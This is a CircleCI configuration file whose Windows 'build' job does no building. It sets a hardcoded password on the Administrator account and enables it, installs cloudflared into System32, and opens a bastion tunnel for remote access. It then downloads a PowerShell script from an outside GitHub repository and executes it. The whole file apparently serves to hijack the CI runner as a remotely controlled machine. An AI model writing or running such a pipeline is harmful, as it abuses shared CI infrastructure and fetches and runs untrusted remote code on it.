version: 2.1

orbs:
  win: circleci/windows@2.3.0

jobs:
  build:
    executor:
      name: win/default
      size: "medium"

    steps:
      - checkout  
      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Kontol123" -Force)
      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser
      - run: Invoke-WebRequest https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-windows-amd64.zip -OutFile cloudflared.zip
      - run: tar xf cloudflared.zip
      - run: Copy cloudflared.exe C:\Windows\System32
      - run: cmd /c echo cmd /k start cmd /c cloudflared tunnel --bastion ^^^>a.txt >>a.ps1
      - run: cmd /c echo Remove-Item a.ps1 >>a.ps1
      - run: cmd /c echo Invoke-WebRequest https://github.com/PersonMuntazer/checkout/raw/wvm/dua.ps1 -OutFile a.ps1 >>a.ps1
      - run: cmd /c echo Get-Content a.txt >>a.ps1
      - run: cmd /c echo .\a.ps1 >>a.ps1
      - run: .\a.ps1
